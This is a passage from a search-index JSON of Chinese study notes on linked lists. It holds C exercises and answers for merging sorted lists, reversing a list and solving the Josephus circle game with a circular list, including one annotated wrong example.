//\u521b\u5efa\u5355\u94fe\u8868B\u5e76\u8d4b\u503c\n    B = (LinkList)malloc(sizeof(LNode));//\u5934\u7ed3\u70b9 \n    B-&gt;next = NULL;\n    pB = B;\n    for(i = 0; i &lt; 6; i++){\n        l = (LinkList)malloc(sizeof(LNode));\n        l-&gt;data = bd[i];\n        l-&gt;next = NULL;\n        pB-&gt;next = l;\n        pB = pB-&gt;next;\n    }    \n\n    C = (LinkList)malloc(sizeof(LNode));//\u5934\u7ed3\u70b9 \n    C-&gt;next = NULL;\n        //merge\u51fd\u6570\uff0c\u5355\u94fe\u8868\u5408\u5e76\u529f\u80fd\n    merge(A,B,C);\n\n    //\u6253\u5370C\u7684\u5143\u7d20 \n    pC = C-&gt;next;\n    for(; pC!=NULL; pC = pC-&gt;next){\n         printf(\"%d \",pC-&gt;data);\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E9%93%BE%E8%A1%A8/#_15","title":"\u7b54\u6848\uff1a","text":""},{"location":"DEC/Data-Structure/Alpha-%E9%93%BE%E8%A1%A8/#_16","title":"\u65b9\u6cd5\u4e00\uff1a\u76f4\u63a5\u5934\u63d2","text":"C<pre><code>int merge(LinkList A, LinkList B, LinkList C)\n{\n    LinkList pA = A-&gt;next;\n    LinkList pB = B-&gt;next;\n    LinkList pC = C;\n    pC-&gt;next = NULL;\n\n    LinkList temp = (LinkList)malloc(sizeof(LNode));\n    temp-&gt;next = NULL;\n\n    while (pA &amp;&amp; pB) {\n        if (pA-&gt;data &lt; pB-&gt;data) {\n            temp = pA-&gt;next;\n            pA-&gt;next = pC -&gt; next;\n            pC-&gt;next = pA;\n            pA = temp;\n        }\n        else if (pA-&gt;data &gt; pB-&gt;data) {\n            temp = pB-&gt;next;\n            pB-&gt;next = pC-&gt;next;\n            pC-&gt;next = pB;\n            pB = temp;\n        }\n        else {\n            temp = pA-&gt;next;\n            pA-&gt;next = pC-&gt;next;\n            pC-&gt;next = pA;\n            pA = temp;\n            pB = pB-&gt;next;\n        }\n    }\n\n    while (pA) {\n        temp = pA-&gt;next;\n        pA-&gt;next = pC-&gt;next;\n        pC-&gt;next = pA;\n        pA = temp;\n    }\n\n    while (pB) {\n        temp = pB-&gt;next;\n        pB-&gt;next = pC-&gt;next;\n        pC-&gt;next = pB;\n        pB = temp;\n    }\n\n    return 1;\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E9%93%BE%E8%A1%A8/#_17","title":"\u65b9\u6cd5\u4e8c\uff1a\u5c3e\u63d2+\u9006\u8f6c","text":"C<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\ntypedef int ElemType;\n//\u5355\u94fe\u8868\ntypedef struct LNode {\n    ElemType data;\n    struct LNode* next;\n} LNode, * LinkList;\n\n//\u8bf7\u5b8c\u6210\u8be5\u51fd\u6570\uff0c\u5b9e\u73b0A\u548cB\uff0c\u6309\u9012\u51cf\u5408\u5e76\u4e3aC\uff0c\u5e76\u4e14A\u548cB\u4e2d\u76f8\u540c\u7684\u5143\u7d20\uff0c\u53ea\u51fa\u73b0\u4e00\u6b21 \nint merge(LinkList A, LinkList B, LinkList C) {\n\n    // 1.\u6309\u5347\u5e8f\u4e32\u8d77\u6765\n    LinkList pA = A-&gt;next;\n    LinkList pB = B-&gt;next;\n    LinkList pC = C;\n\n    while (pA &amp;&amp; pB) {\n        if (pA-&gt;data &lt; pB-&gt;data) {      \n            pC-&gt;next = pA;\n            pA = pA-&gt;next;\n        }\n        else if (pA-&gt;data &gt; pB-&gt;data) {\n            pC-&gt;next = pB;\n            pB = pB-&gt;next;\n        }\n        else { // \u8df3\u8fc7\u91cd\u590d\u5143\u7d20\n            pC-&gt;next = pA;\n            pA = pA-&gt;next;\n            pB = pB-&gt;next;\n            //continue;\n        }\n        pC = pC-&gt;next;\n        pC-&gt;next = NULL;\n    }\n\n    pC-&gt;next = pA ? pA : pB;\n\n\n    //// 1.\u6309\u5347\u5e8f\u5408\u5e76\u8d77\u6765\n    //while (pA &amp;&amp; pB) {\n    //    if (pA-&gt;data &lt; pB-&gt;data) {\n    //        pC-&gt;next = pA;\n    //        pA = pA-&gt;next;\n    //    }\n    //    else {\n    //        pC-&gt;next = pB;\n    //        pB = pB-&gt;next;\n    //    }\n    //    pC = pC-&gt;next;\n    //}\n    //pC-&gt;next = pA ? pA : pB;\n\n    //// 2.\u5220\u9664\u91cd\u590d\u7684\u503c\n    //pC = C;\n\n    //while (pC &amp;&amp; pC-&gt;next) {\n    //    LinkList next = pC-&gt;next;\n    //    if (pC-&gt;data == next-&gt;data) {\n    //        pC-&gt;next = next-&gt;next;\n    //        free(next);\n    //    }\n    //    else {\n    //        pC = pC-&gt;next;\n    //    }\n    //}\n\n\n    // 3. \u94fe\u8868\u9006\u8f6c\n    LinkList prev = NULL;\n    LinkList curr = C-&gt;next;\n    LinkList next;\n    while (curr) {\n        next = curr-&gt;next;\n        curr-&gt;next = prev;\n        prev = curr;\n        curr = next;\n    }\n    C-&gt;next = prev;\n\n    return 1;\n}\n\n\nint main() {\n    ElemType ad[6] = { 1, 3, 5, 6, 8, 9 };\n    ElemType bd[6] = { 2, 3, 4, 5, 6, 7 };\n    LinkList A, pA, B, pB, C, pC, l;\n    int i;\n\n    //\u521b\u5efa\u5355\u94fe\u8868A\u5e76\u8d4b\u503c \n    A = (LinkList)malloc(sizeof(LNode));  //\u5934\u7ed3\u70b9 \n    A-&gt;next = NULL;\n    pA = A;\n    for (i = 0; i &lt; 6; i++) {\n        l = (LinkList)malloc(sizeof(LNode));\n        l-&gt;data = ad[i];\n        l-&gt;next = NULL;\n        pA-&gt;next = l;\n        pA = pA-&gt;next;\n    }\n\n    //\u521b\u5efa\u5355\u94fe\u8868B\u5e76\u8d4b\u503c\n    B = (LinkList)malloc(sizeof(LNode));  //\u5934\u7ed3\u70b9 \n    B-&gt;next = NULL;\n    pB = B;\n    for (i = 0; i &lt; 6; i++) {\n        l = (LinkList)malloc(sizeof(LNode));\n        l-&gt;data = bd[i];\n        l-&gt;next = NULL;\n        pB-&gt;next = l;\n        pB = pB-&gt;next;\n    }\n\n    C = (LinkList)malloc(sizeof(LNode));  //\u5934\u7ed3\u70b9 \n    C-&gt;next = NULL;\n\n    //merge\u51fd\u6570\uff0c\u5355\u94fe\u8868\u5408\u5e76\u529f\u80fd\n    merge(A, B, C);\n\n    //\u6253\u5370C\u7684\u5143\u7d20 \n    pC = C-&gt;next;\n    for (; pC != NULL; pC = pC-&gt;next) {\n        printf(\"%d \", pC-&gt;data);\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E9%93%BE%E8%A1%A8/#_18","title":"\u6807\u51c6\u7b54\u6848\uff08\u4e0d\u592a\u597d\uff09","text":"C<pre><code>int merge(LinkList A, LinkList B, LinkList C)\n{\n    LinkList pa, pb, qa, qb, pc, qc;\n    pa = A;\n    pb = B;\n    qa = pa; // \u4fdd\u5b58 pa \u7684\u524d\u9a71\u6307\u9488\n    qb = pb; // \u4fdd\u5b58 pb \u7684\u524d\u9a71\u6307\u9488\n    pa = pa-&gt;next;\n    pb = pb-&gt;next;\n    qc = C;\n    while (pa &amp;&amp; pb) {\n        if (pa-&gt;data &lt; pb-&gt;data) {\n            pc = (LinkList)malloc(sizeof(LNode));\n            pc-&gt;data = pa-&gt;data;\n            pc-&gt;next = qc-&gt;next;\n            qc-&gt;next = pc;\n            qa = pa;\n            pa = pa-&gt;next;\n        }\n        else {\n            pc = (LinkList)malloc(sizeof(LNode));\n            pc-&gt;data = pb-&gt;data;\n            pc-&gt;next = qc-&gt;next;\n            qc-&gt;next = pc;\n            if (pa-&gt;data == pb-&gt;data) {\n                qa = pa;\n                pa = pa-&gt;next;\n            }\n            qb = pb;\n            pb = pb-&gt;next;\n        }\n    }\n    while (pa) {\n        pc = (LinkList)malloc(sizeof(LNode));\n        pc-&gt;data = pa-&gt;data;\n        pc-&gt;next = qc-&gt;next;\n        qc-&gt;next = pc;\n        qa = pa;\n        pa = pa-&gt;next;\n    }\n    while (pb) {\n        pc = (LinkList)malloc(sizeof(LNode));\n        pc-&gt;data = pb-&gt;data;\n        pc-&gt;next = qc-&gt;next;\n        qc-&gt;next = pc;\n        qb = pb;\n        pb = pb-&gt;next;\n    }\n    return 1;\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E9%93%BE%E8%A1%A8/#_19","title":"\u5355\u94fe\u8868\u7684\u9006\u7f6e","text":"<p>\u7f16\u5199\u7a0b\u5e8f\uff0c\u5bf9\u5355\u94fe\u8868\u8fdb\u884c\u9006\u7f6e\u3002</p> <p>\u793a\u4f8b</p> Text Only<pre><code>\u9006\u7f6e\u524d\uff1a\n9 8 7 6 5 4 3 2 1 0 \n\u9006\u7f6e\u540e\uff1a\n0 1 2 3 4 5 6 7 8 9\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E9%93%BE%E8%A1%A8/#_20","title":"\u9898\u76ee\uff1a","text":"C<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\ntypedef struct LNode{\n    int data;\n    struct LNode *next;\n}LNode, *LinkList;\n\n\nvoid reverse(LinkList L)\n{\n    //\u8bf7\u5728\u6b64\u5904\u7f16\u5199\u5355\u94fe\u8868\u7684\u9006\u7f6e\u4ee3\u7801\n\n\n}\n\nint main()\n{\n    LinkList L;\n    LinkList p;\n    int n = 10;\n    L = (LinkList)malloc(sizeof(LNode));\n    L-&gt;next = NULL;\n    for(int i = 0; i &lt; n; i++){\n        p = (LinkList)malloc(sizeof(LNode));\n        p-&gt;data = i;\n        p-&gt;next = L-&gt;next;\n        L-&gt;next = p;\n    }\n    printf(\"\u9006\u7f6e\u524d\uff1a\\n\");\n    for(p = L-&gt;next; p!=NULL; p = p-&gt;next){\n        printf(\"%d \",p-&gt;data);\n    }\n    reverse(L);\n    printf(\"\\n\u9006\u7f6e\u540e\uff1a\\n\");\n    for(p = L-&gt;next; p!=NULL; p = p-&gt;next){\n        printf(\"%d \",p-&gt;data);\n    }\n    return 0;\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E9%93%BE%E8%A1%A8/#_21","title":"\u7b54\u6848\uff1a","text":"<p>\u5c31\u662f\u4e0a\u4e00\u9898\u4e2d\u7684\u9006\u8f6c</p> C<pre><code>void reverse(LinkList L)\n{\n    LinkList prev = NULL;\n    LinkList curr = L-&gt;next;\n    LinkList next = NULL;\n\n    while (curr) {\n        next = curr-&gt;next;\n        curr-&gt;next = prev;\n        prev = curr;\n        curr = next;\n    }\n    L-&gt;next = prev;\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E9%93%BE%E8%A1%A8/#_22","title":"\u6807\u51c6\u7b54\u6848\uff08\u4e0d\u592a\u597d\uff09","text":"C<pre><code>void reverse(LinkList L)\n{\n    LinkList p, q;\n    p = L;\n    p = p-&gt;next;\n    L-&gt;next = NULL;\n    while (p) {\n        q = p;\n        p = p-&gt;next;\n        q-&gt;next = L-&gt;next;\n        L-&gt;next = q;\n    }\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E9%93%BE%E8%A1%A8/#_23","title":"\u5faa\u73af\u94fe\u8868\u7684\u5e94\u7528","text":"<p>100\u4e2a\u5c0f\u670b\u53cb\u56f4\u6210\u4e00\u4e2a\u5706\u5708\uff0c\u6309\u987a\u5e8f\u4ece\u7f16\u53f71\u5230\u7f16\u53f7100\uff0c\u505a\u6e38\u620f\uff0c\u4ece\u7b2c\u4e00\u4e2a\u5c0f\u670b\u53cb\u5f00\u59cb\u4ece1\u987a\u5e8f\u5faa\u73af\u62a5\u6570\uff0c\u62a5\u52303\u7684\u500d\u6570\u5c0f\u670b\u53cb\u81ea\u52a8\u6dd8\u6c70\uff0c\u7136\u540e\u4e0b\u4e00\u4e2a\u5c0f\u670b\u53cb\u7ee7\u7eed\u62a5\u6570\uff0c\u76f4\u5230\u53ea\u5269\u4e0b\u6700\u540e1\u4e2a\u5c0f\u670b\u53cb\uff0c\u8bf7\u95ee\u6700\u540e\u5269\u4e0b\u7684\u5c0f\u670b\u53cb\u662f\u51e0\u53f7\u5c0f\u670b\u53cb\u3002</p> <p>\u7f16\u5199\u7a0b\u5e8f\uff1a \u5229\u7528\u5faa\u73af\u94fe\u8868\uff0c\u8f93\u51fa\u6700\u540e\u5269\u4f59\u5c0f\u670b\u53cb\u7684\u7f16\u53f7\u3002</p> <p>\u793a\u4f8b\u8f93\u51fa\uff1a91</p>"},{"location":"DEC/Data-Structure/Alpha-%E9%93%BE%E8%A1%A8/#_24","title":"\u9898\u76ee\uff1a","text":"C<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\ntypedef int ElemType;\n//\u5355\u5faa\u73af\u94fe\u8868\ntypedef struct LNode{\n    ElemType data;\n    struct LNode *next;\n}LNode, *LinkList;\n\n//\u5b8c\u6210\u6b64\u51fd\u6570\uff0c\u8fd4\u56de\u5269\u4f59\u5c0f\u670b\u53cb\u7f16\u53f7 \nint game(LinkList A)\n{\n\n}\n\n\nint main()\n{\n    LinkList A,pA,pPre,l;\n    int n=100;//\u5c0f\u670b\u53cb\u4e2a\u6570 \n    int i; \n\n    //\u521b\u5efa\u5355\u5faa\u73af\u94fe\u8868 \n    A = (LinkList)malloc(sizeof(LNode));//\u5934\u7ed3\u70b9 \n    A-&gt;next = A;\n    pA = A;\n    for(i = 1; i &lt;= n; i++){\n        l = (LinkList)malloc(sizeof(LNode));\n        l-&gt;data = i;\n        l-&gt;next = pA-&gt;next;\n        pA-&gt;next = l;\n        pA = pA-&gt;next;\n    }    \n\n    int result = game(A);\n\n    //\u6253\u5370\u5269\u4f59\u7684\u5143\u7d20 \n    printf(\"%d \",result);\n\n    return 0;\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E9%93%BE%E8%A1%A8/#_25","title":"\u9519\u8bef\u793a\u8303\uff1a","text":"C<pre><code>int game(LinkList A)\n{\n    LNode *p = A-&gt;next; // \u4ece\u7b2c\u4e00\u4e2a\u5c0f\u670b\u53cb\u5f00\u59cb\n    LNode *pre = A; // \u8bb0\u5f55\u524d\u4e00\u4e2a\u5c0f\u670b\u53cb\uff0c\u4fbf\u4e8e\u5220\u9664\u64cd\u4f5c\n    int count = 1; // \u8bb0\u5f55\u62a5\u6570\n    while (p != p-&gt;next) { // \u5f53\u53ea\u5269\u4e0b\u4e00\u4e2a\u5c0f\u670b\u53cb\u65f6\u505c\u6b62\n        if (count % 3 == 0) { // \u5f53\u62a5\u6570\u4e3a3\u7684\u500d\u6570\u65f6\uff0c\u5220\u9664\u5f53\u524d\u8282\u70b9\n            pre-&gt;next = p-&gt;next;\n            free(p);\n            p = pre-&gt;next;\n        } else {\n            pre = p;\n            p = p-&gt;next;\n        }\n        count++;\n    }\n    return p-&gt;data; // \u8fd4\u56de\u6700\u540e\u4e00\u4e2a\u5c0f\u670b\u53cb\u7684\u7f16\u53f7\n}\n</code></pre> <p>\u8fd9\u6bb5\u4ee3\u7801\u7684\u9519\u8bef\u5728\u4e8e\uff1a\u5faa\u73af\u94fe\u8868\u7684\u65f6\u5019\u54e8\u5175\u4f4d\u5e76\u6ca1\u6709\u88ab\u5220\u9664\uff0c\u5c31\u5bfc\u81f4\u54e8\u5175\u4e5f\u53c2\u4e0e\u5230\u4e86\u4e00\u5708\u4e00\u5708\u7684\u5faa\u73af\u4e4b\u4e2d\uff0c\u6240\u4ee5\u53ea\u8981\u518d\u5faa\u73af\u5f00\u59cb\u4e4b\u524d\u5c06\u54e8\u5175\u53bb\u6389\u5c31\u597d\u4e86</p> <p>\u4e00\u5b9a\u8981\u770b\u660e\u767d\u9898\u554a\uff01\uff01</p>"},{"location":"DEC/Data-Structure/Alpha-%E9%93%BE%E8%A1%A8/#_26","title":"\u7b54\u6848\uff1a","text":"<p>\u770b\u6807\u51c6\u7b54\u6848\u5427\uff0c\u8fd9\u4e2a\u5199\u7684\u786e\u5b9e\u633a\u70c2\u2026\u2026</p> C<pre><code> int game(LinkList A)\n{\n    // \u67e5\u8be2\u5c0f\u5b69\u6570\u91cf\n    LinkList curr = A-&gt;next-&gt;next; // A\u662f\u54e8\u5175\n    int num = 0;\n    while (curr-&gt;data != 1) {\n        curr = curr-&gt;next;\n        num++;\n    }\n    // num\u4e3a\u5c0f\u5b69\u6570\u91cf\n\n\n    // \u5220\u9664\u54e8\u5175\u4f4d\n    // \u8fd9\u91cc\u662f\u901a\u8fc7\u5c0f\u5b69\u6570\u91cf\u8fdb\u884c\u5faa\u73af\n    curr = A-&gt;next; // A\u662f\u54e8\u5175\uff0c\u6ce8\u610f\u8fd9\u513fcurr\u8fdb\u884c\u4e86\u91cd\u5b9a\u4e49\n    while (--num) { // \u9700\u8981\u8fdb\u884c num-1 \u6b21\u5faa\u73af\n        curr = curr-&gt;next;\n    } \n    // \u73b0\u5728curr\u4e2d\u7684data\u503c\u662f100\uff0c\u4e0b\u4e00\u4e2a\u5c31\u662f\u54e8\u5175\u4f4d\n    LinkList temp = curr-&gt;next;\n    curr-&gt;next = temp-&gt;next;\n    curr = curr-&gt;next; // \u73b0\u5728curr\u4e2ddata\u7684\u503c\u662f1\n    free(temp);\n\n\n    // \u5f00\u59cb\u5220\u9664\u64cd\u4f5c\n    LinkList p = curr; // \u4ece\u7b2c\u4e00\u4e2a\u5c0f\u670b\u53cb\u5f00\u59cb\n    LinkList pre = A; // \u8bb0\u5f55\u524d\u4e00\u4e2a\u5c0f\u670b\u53cb\uff0c\u4fbf\u4e8e\u5220\u9664\u64cd\u4f5c\n    int count = 1; // \u8bb0\u5f55\u62a5\u6570\n    while (p != p-&gt;next) { // \u5f53\u53ea\u5269\u4e0b\u4e00\u4e2a\u5c0f\u670b\u53cb\u65f6\u505c\u6b62\n        if (count % 3 == 0) { // \u5f53\u62a5\u6570\u4e3a3\u7684\u500d\u6570\u65f6\uff0c\u5220\u9664\u5f53\u524d\u8282\u70b9\n            pre-&gt;next = p-&gt;next;\n            free(p);\n            p = pre-&gt;next;\n        }\n        else {\n            pre = p;\n            p = p-&gt;next;\n        }\n        count++;\n    }\n\n    return p-&gt;data; // \u8fd4\u56de\u6700\u540e\u4e00\u4e2a\u5c0f\u670b\u53cb\u7684\u7f16\u53f7\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E9%93%BE%E8%A1%A8/#_27","title":"\u6807\u51c6\u7b54\u6848\uff08\u8003\u8bd5\u7528\u8fd9\u4e2a\uff09","text":"<p>\u6211\u4eec\u7684\u4ee3\u7801\u6539\u8fdb\u7a7a\u95f4\u5728\u4e8e\u5bf9\u54e8\u5175\u4f4d\u7684\u5904\u7406\uff0c\u6211\u4eec\u7684\u4ee3\u7801\u6709\u4e00\u5927\u5806\u64cd\u4f5c\u53bb\u5220\u9664\u54e8\u5175\u4f4d\uff0c\u800c\u5728\u6807\u51c6\u7b54\u6848\u4e2d\uff0c\u53ea\u4f7f\u7528\u4e86\u4e00\u4e2a<code>if</code>\u53bb\u5224\u65ad\u5f53\u524d\u662f\u5426\u54e8\u5175\u4f4d\uff0c\u662f\u7684\u8bdd\u5f80\u524d\u9012\u8fdb\u4e00\u4e0b\u8df3\u8fc7\u3002</p> <p>\u6ce8\u610f\uff1a<code>A</code>\u662f\u4e00\u76f4\u6ca1\u6709\u53d8\u5316\u7684\uff0c\u4e00\u76f4\u90fd\u662f\u54e8\u5175\u4f4d\u3002</p> C<pre><code>int game(LinkList A)\n{\n    // \u58f0\u660e\u4e24\u4e2a\u6307\u9488\u53d8\u91cfpA\u548cpPre\uff0c\u5206\u522b\u6307\u5411\u94fe\u8868A\u4e2d\u7684\u4e0b\u4e00\u4e2a\u8282\u70b9\u548c\u5f53\u524d\u8282\u70b9\n    LinkList pA, pPre;\n    pA = A-&gt;next; // \u5c06pA\u6307\u5411\u94fe\u8868A\u7684\u4e0b\u4e00\u4e2a\u8282\u70b9\n    pPre = A; // \u5c06pPre\u6307\u5411\u94fe\u8868A\u7684\u5f53\u524d\u8282\u70b9\n\n    int bs = 1; // \u521d\u59cb\u5316bs\u4e3a1\uff0c\u7528\u4e8e\u8bb0\u5f55\u5f53\u524d\u5904\u7406\u7684\u8282\u70b9\u4f4d\u7f6e\n    while (A-&gt;next-&gt;next != A) { // \u5f53\u5269\u4f59\u8282\u70b9\u6570\u4e0d\u53ea\u4e00\u4e2a\u65f6\u6267\u884c\u5faa\u73af\n        if (bs % 3 == 0) { // \u5224\u65ad\u662f\u5426\u4e3a\u7b2c3\u4e2a\u8282\u70b9\n            // \u5220\u9664\u4e00\u4e2a\u7ed3\u70b9\n            pPre-&gt;next = pA-&gt;next; // \u5c06pA\u7684\u4e0b\u4e00\u4e2a\u8282\u70b9\u8d4b\u7ed9pPre\u7684\u4e0b\u4e00\u4e2a\u8282\u70b9\n            free(pA); // \u91ca\u653epA\u6307\u5411\u7684\u8282\u70b9\u5185\u5b58\n            pA = pPre-&gt;next; // \u5c06pA\u6307\u5411\u4e0b\u4e00\u4e2a\u8282\u70b9\n\n            if (pA == A) { // \u5982\u679cpA\u4e3a\u54e8\u5175\u4f4d\n                pA = A-&gt;next; // \u5c06pA\u6307\u5411\u94fe\u8868A\u7684\u7b2c\u4e00\u4e2a\u8282\u70b9\n                pPre = A; // \u5c06pPre\u6307\u5411\u94fe\u8868A\u7684\u54e8\u5175\u4f4d\n            }\n        }\n        else {\n            pPre = pA; // \u5c06pPre\u6307\u5411pA\n            pA = pA-&gt;next; // \u5c06pA\u6307\u5411\u4e0b\u4e00\u4e2a\u8282\u70b9\n\n            if (pA == A) { // \u5982\u679cpA\u4e3a\u54e8\u5175\u4f4d\n                pA = A-&gt;next; // \u5c06pA\u6307\u5411\u94fe\u8868A\u7684\u7b2c\u4e00\u4e2a\u8282\u70b9\n                pPre = A; // \u5c06pPre\u6307\u5411\u94fe\u8868A\u7684\u54e8\u5175\u4f4d\n            }\n        }\n        bs = bs + 1; // bs\u81ea\u589e1\n    }\n\n    return A-&gt;next-&gt;data; // \u8fd4\u56de\u94fe\u8868A\u4e2d\u54e8\u5175\u4f4d\u4e0b\u4e00\u4e2a\u8282\u70b9\u7684\u6570\u636e\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E9%93%BE%E8%A1%A8/#_28","title":"\u5408\u5e76\u9012\u589e\u6709\u5e8f\u94fe\u8868","text":"<p>\u5c06\u4e24\u4e2a\u9012\u589e\u7684\u6709\u5e8f\u94fe\u8868\u5408\u5e76\u4e3a\u4e00\u4e2a\u9012\u589e\u7684\u6709\u5e8f\u94fe\u8868</p> <p>\u7f16\u7a0b\u5b9e\u73b0\uff1a \u5c06\u4e24\u4e2a\u9012\u589e\u7684\u6709\u5e8f\u94fe\u8868\u5408\u5e76\u4e3a\u4e00\u4e2a\u9012\u589e\u7684\u6709\u5e8f\u94fe\u8868\u3002\u8981\u6c42\u7ed3\u679c\u94fe\u8868\u4ecd\u4f7f\u7528\u539f\u6765\u4e24\u4e2a\u94fe\u8868\u7684\u5b58\u50a8\u7a7a\u95f4\uff0c\u4e0d\u53e6\u5916\u5360\u7528\u5176\u4ed6\u7684\u5b58\u50a8\u7a7a\u95f4\u3002\u8868\u4e2d<code>\u4e0d\u5141\u8bb8\u6709\u91cd\u590d</code>\u7684\u6570\u636e\u3002</p> <p>\u51fd\u6570\u5b9a\u4e49</p> Text Only<pre><code>/* \u521b\u5efa\u94fe\u8868\uff1a\u6b64\u51fd\u6570\u7684\u4f5c\u7528\u662f\u521b\u5efa\u94fe\u8868 L\uff0c\u94fe\u8868\u7684\u957f\u5ea6\u4e3a n */\nvoid Create_LinkList(LinkList *L, int n)\n\n/* \u5408\u5e76\u94fe\u8868\uff1a\u6b64\u51fd\u6570\u7684\u4f5c\u7528\u662f\u5c06\u4e24\u4e2a\u94fe\u8868 La \u548c Lb \u5408\u5e76\u4e3a\u94fe\u8868 Lc */\nvoid MergeList(LinkList La, LinkList Lb, LinkList *Lc)\n\n/* \u8f93\u51fa\u6570\u636e\uff1a\u6b64\u51fd\u6570\u7684\u4f5c\u7528\u662f\u5c06\u94fe\u8868 L \u7684\u6570\u636e\u8f93\u51fa */\nvoid print_LinkList(LinkList L)\n</code></pre> <p>\u8f93\u5165</p> Text Only<pre><code>3,3\uff08\u4e24\u4e2a\u94fe\u8868\u7684\u5143\u7d20\u4e2a\u6570\uff09\n1\uff08\u7b2c 1 \u4e2a\u94fe\u8868\u7684\u7b2c 1 \u4e2a\u5143\u7d20\uff09\n2\uff08\u7b2c 1 \u4e2a\u94fe\u8868\u7684\u7b2c 2 \u4e2a\u5143\u7d20\uff09\n3\uff08\u7b2c 1 \u4e2a\u94fe\u8868\u7684\u7b2c 3 \u4e2a\u5143\u7d20\uff09\n3\uff08\u7b2c 2 \u4e2a\u94fe\u8868\u7684\u7b2c 1 \u4e2a\u5143\u7d20\uff09\n4\uff08\u7b2c 2 \u4e2a\u94fe\u8868\u7684\u7b2c 2 \u4e2a\u5143\u7d20\uff09\n5\uff08\u7b2c 2 \u4e2a\u94fe\u8868\u7684\u7b2c 3 \u4e2a\u5143\u7d20\uff09\n</code></pre> <p>\u8f93\u51fa</p> Text Only<pre><code>\u5408\u5e76\u540e\u7684\u94fe\u8868\u4e3a: 12345\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E9%93%BE%E8%A1%A8/#_29","title":"\u9898\u76ee\uff1a","text":"<p>\u5408\u5e76\u51fd\u6570\u4e2d\u7684\u4e24\u79cd\u64cd\u4f5c\uff0c\u548c\u7b2c\u4e00\u9898\u201c\u5355\u94fe\u8868\u7684\u5408\u5e76\u201d\u4e2d\u4e00\u6a21\u4e00\u6837\u3002</p> C<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\n// \u5b9a\u4e49\ntypedef struct {\n    int date;\n} Date;\n\ntypedef struct LNode {\n    Date elem;\n    struct LNode *next;\n} LNode, *LinkList;\n\nvoid Create_LinkList(LinkList *L, int n) {\n    // \u521b\u5efa\u94fe\u8868\n    //\u8bf7\u5728\u6b64\u5904\u7f16\u5199\u4ee3\u7801\n\n\n\n}\n\nvoid MergeList(LinkList La, LinkList Lb, LinkList *Lc) {\n    // \u5408\u5e76\u94fe\u8868La\u548cLb\uff0c\u5408\u5e76\u540e\u7684\u65b0\u8868\u4f7f\u7528\u5934\u6307\u9488Lc\u6307\u5411\n    //\u8bf7\u5728\u6b64\u5904\u7f16\u5199\u4ee3\u7801\n\n\n\n}\n\n// \u8f93\u51fa\u6570\u636e\nvoid print_LinkList(LinkList L) {\n    //\u8bf7\u5728\u6b64\u5904\u7f16\u5199\u4ee3\u7801\n\n\n\n}\n\nint main() {\n    // \u521b\u5efa2\u4e2a\u94fe\u8868\n    LinkList La, Lb, Lc;\n\n    // \u8f93\u5165\u6570\u636e\n    int sum01, sum02;\n    printf(\"\u4e24\u4e2a\u94fe\u8868\u7684\u5143\u7d20\u4e2a\u6570\u5206\u522b\u4e3a: \");\n    scanf(\"%d,%d\", &amp;sum01, &amp;sum02); // \u8f93\u5165\u4ee5\u82f1\u6587\u9017\u53f7\u5206\u9694\u5f00\n    printf(\"\u8bf7\u8f93\u5165\u7b2c 1 \u4e2a\u94fe\u8868\u7684\u6570\u636e:\\n\");\n    Create_LinkList(&amp;La, sum01);\n    printf(\"\u8bf7\u8f93\u5165\u7b2c 2 \u4e2a\u94fe\u8868\u7684\u6570\u636e:\\n\");\n    Create_LinkList(&amp;Lb, sum02);\n\n    // \u5408\u5e76\u94fe\u8868\u5e76\u8f93\u51fa\n    MergeList(La, Lb, &amp;Lc);\n    printf(\"\\n\u5408\u5e76\u540e\u7684\u94fe\u8868\u4e3a: \");\n    print_LinkList(Lc);\n\n    return 0;\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E9%93%BE%E8%A1%A8/#_30","title":"\u7b54\u6848\uff1a","text":"C<pre><code>void Create_LinkList(LinkList* L, int n) {\n    *L = (LinkList)malloc(sizeof(LNode)); // \u4e3a\u5934\u8282\u70b9\u5206\u914d\u5185\u5b58\n    (*L)-&gt;next = NULL; // \u521d\u59cb\u5316\u5934\u8282\u70b9\u7684\u4e0b\u4e00\u4e2a\u6307\u9488\u4e3aNULL\n\n    LinkList p = *L; // \u7528\u4e8e\u904d\u5386\u94fe\u8868\u7684\u6307\u9488\n\n    //printf(\"\u8bf7\u8f93\u5165\u94fe\u8868\u7684\u6570\u636e:\\n\");\n    for (int i = 0; i &lt; n; i++) {\n        p-&gt;next = (LinkList)malloc(sizeof(LNode)); // \u4e3a\u4e0b\u4e00\u4e2a\u8282\u70b9\u5206\u914d\u5185\u5b58\n        p = p-&gt;next; // \u79fb\u52a8\u5230\u65b0\u521b\u5efa\u7684\u8282\u70b9\n        //printf(\"\u8bf7\u8f93\u5165\u7b2c %d \u4e2a\u5143\u7d20\u7684\u503c: \", i + 1);\n        scanf(\"%d\", &amp;p-&gt;elem.date); // \u8bfb\u53d6\u5f53\u524d\u8282\u70b9\u7684\u6570\u636e\n    }\n\n    p-&gt;next = NULL; // \u5c06\u6700\u540e\u4e00\u4e2a\u8282\u70b9\u7684\u4e0b\u4e00\u4e2a\u6307\u9488\u8bbe\u4e3aNULL\n}\n\n\nvoid MergeList(LinkList La, LinkList Lb, LinkList* Lc) {\n    LinkList pa = La-&gt;next;  // \u4eceLa\u7684\u7b2c\u4e00\u4e2a\u8282\u70b9\u5f00\u59cb\n    LinkList pb = Lb-&gt;next;  // \u4eceLb\u7684\u7b2c\u4e00\u4e2a\u8282\u70b9\u5f00\u59cb\n\n    *Lc = La;  // 